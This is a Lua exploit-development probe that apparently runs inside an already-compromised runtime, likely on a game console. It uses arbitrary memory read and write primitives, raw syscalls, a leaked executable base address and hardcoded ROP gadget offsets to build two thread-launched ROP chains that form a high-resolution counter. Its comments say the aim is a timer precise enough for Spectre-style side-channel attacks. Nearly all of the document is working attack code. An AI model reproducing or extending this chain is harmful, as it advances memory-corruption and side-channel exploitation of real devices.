-- CRASH_CLASS: MODERATE
-- PROBE 1199l: Two-child timer with parent-gated launch (v4)
--
-- v1: both children, reader saw 50000 (counter too fast, 50K ticks)
-- v2: parent reads — WORKS! Lua reads ~1.4μs each (too slow for Spectre)
-- v3: reader first, all zeros (reader finished before counter started)
-- v4: counter first, parent POLLS until counter > 0, THEN launches reader.
--   This guarantees the counter is running when reader starts.

print("=== PROBE 1199l: Gated two-child timer (v4) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

-- SIG_IGN
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Shared
local shared = memory.alloc(0x200)
local sha = N(shared)
for i = 0, 0x1FC, 4 do wd(sha + i, 0) end

local counter_a = sha
local results_a = sha + 0x40
local done_ctr  = sha + 0x100
local done_rdr  = sha + 0x108

local sc_mmap = mk(477)

-- =============================================
-- COUNTER CHAIN: 200K ticks
-- =============================================
local TICKS = 200000

local ctr_buf = sc_mmap(uint64(0), uint64(0x800000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi);  ec(uint64(129))
ec(g_pop_rsi);  ec(uint64(N(fs_ptr)))
ec(g_pop_rax);  ec(uint64(165))
ec(stub)
ec(g_pop_rdi);  ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax);  ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi);  ec(uint64(done_ctr))
ec(g_pop_rax);  ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi);  ec(uint64(0))
ec(g_pop_rax);  ec(uint64(431))
ec(stub)

print(string.format("counter: %d ticks, %d bytes", TICKS, off))

-- =============================================
-- READER CHAIN: 20 reads, 200 NOP delay between each
-- Each read: pop_rax→&counter, mov rax,[rax], pop_rdi→&result[r], mov [rdi],rax
-- =============================================
local NUM_READS = 20
local DELAY_NOPS = 200

local rdr_buf = sc_mmap(uint64(0), uint64(0x100000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(rdr_buf) >= 0xFFFF0000 then print("FATAL: rdr mmap"); return end
local rdr_base = N(rdr_buf)
local ss_r = 0x1000
local rsp_r = rdr_base + ss_r - ((rdr_base + ss_r) % 16) - 8

local off_r = 0
local function er(v) wq(rsp_r + off_r, v); off_r = off_r + 8 end

-- sysarch
er(g_pop_rdi);  er(uint64(129))
er(g_pop_rsi);  er(uint64(N(fs_ptr)))
er(g_pop_rax);  er(uint64(165))
er(stub)

-- NO startup delay — counter is confirmed running before this thread launches

for r = 0, NUM_READS - 1 do
    -- read counter: rax = *counter
    er(g_pop_rax);    er(uint64(counter_a))
    er(g_mov_rax_mem)
    -- store: [results[r]] = rax
    er(g_pop_rdi);    er(uint64(results_a + r * 8))
    er(g_mov_m_rax)

    if r < NUM_READS - 1 then
        for n = 1, DELAY_NOPS do
            er(g_pop_rax);  er(uint64(0))
        end
    end
end

er(g_pop_rdi);  er(uint64(done_rdr))
er(g_pop_rax);  er(uint64(0xBEEF))
er(g_mov_m_rax)
er(g_pop_rdi);  er(uint64(0))
er(g_pop_rax);  er(uint64(431))
er(stub)

print(string.format("reader: %d reads, %d NOPs, %d bytes", NUM_READS, DELAY_NOPS, off_r))

-- =============================================
-- LAUNCH: counter first, poll, then reader
-- =============================================
print("")

-- Counter param
local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 8, uint64(0))
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
local ok_c, rv_c = pcall(function() return mk(455)(uint64(pc_), uint64(0x38)) end)
print("counter ret=" .. (ok_c and tostring(N(rv_c)) or "FAIL"))

-- POLL: wait until counter > 0 (counter is live)
local poll_count = 0
local gate_val = 0
for p = 1, 10000 do
    local v = rd(counter_a) or 0
    poll_count = poll_count + 1
    if v > 0 then
        gate_val = v
        break
    end
end
print(string.format("gate: counter=%d after %d polls", gate_val, poll_count))

if gate_val == 0 then
    print("** counter never started — ABORT **")
    -- still wait for it
    for w = 1, 100000 do local _ = rd(sha) end
    print("done_ctr=0x" .. string.format("%X", rd(done_ctr) or 0))
    print("counter=" .. (rd(counter_a) or 0))
    return
end

-- Reader param
local par_r = memory.alloc(0x40)
local pr = N(par_r)
for i = 0, 0x3C, 4 do wd(pr + i, 0) end
wq(pr, g_bare_ret)
wq(pr + 8, uint64(0))
wq(pr + 0x10, uint64(rdr_base))
wq(pr + 0x18, uint64(ss_r))
local tid_r = memory.alloc(8); wq(N(tid_r), uint64(0))
wq(pr + 0x30, tid_r)

print("launching reader...")
local ok_r, rv_r = pcall(function() return mk(455)(uint64(pr), uint64(0x38)) end)
print("reader ret=" .. (ok_r and tostring(N(rv_r)) or "FAIL"))

-- Wait for both
for w = 1, 100000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end
print("ALIVE")

-- =============================================
-- RESULTS
-- =============================================
print("")
local dc = rd(done_ctr) or 0
local dr = rd(done_rdr) or 0
local cf = rd(counter_a) or 0
print(string.format("done_ctr=0x%X  done_rdr=0x%X  counter=%d", dc, dr, cf))

print("")
print("reader snapshots:")
local mono = true
local all_final = true
local all_zero = true
local prev = -1
for r = 0, NUM_READS - 1 do
    local val = rq(results_a + r * 8)
    local vh, vl = get_hi_lo(val)
    local v = vl
    if v ~= 0 then all_zero = false end
    if v ~= TICKS then all_final = false end
    if r > 0 and v < prev then mono = false end
    local delta = r > 0 and (v - prev) or 0
    print(string.format("  [%2d] = %6d  (d=%d)", r, v, delta))
    prev = v
end

print("")
if all_zero then
    print("** ALL ZERO — reader ran before counter writes visible **")
elseif all_final then
    print("** ALL = 200000 — counter finished before reader read **")
elseif mono and not all_zero and not all_final then
    local first = 0
    for r = 0, NUM_READS - 1 do
        local val = rq(results_a + r * 8)
        local vh, vl = get_hi_lo(val)
        if vl > 0 then first = vl; break end
    end
    local avg = (prev - first) / math.max(NUM_READS - 1, 1)
    print("** MONOTONIC — ROP-speed counting timer CONFIRMED! **")
    print(string.format("  first=%d last=%d", first, prev))
    print(string.format("  avg delta: %.1f ticks per %d NOPs", avg, DELAY_NOPS))
    print(string.format("  each NOP ≈ 2 gadgets × ~1.4ns = ~2.8ns"))
    print(string.format("  %d NOPs ≈ %.0f ns", DELAY_NOPS, DELAY_NOPS * 2.8))
    print(string.format("  counter ticks per NOP interval: %.1f", avg))
    print(string.format("  → each counter tick ≈ %.1f ns",
        (DELAY_NOPS * 2.8) / math.max(avg, 1)))
else
    print("** NOT MONOTONIC — scheduling artifact? **")
    print(string.format("  first=%d last=%d", rd(results_a) or 0, prev))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199l COMPLETE ===")
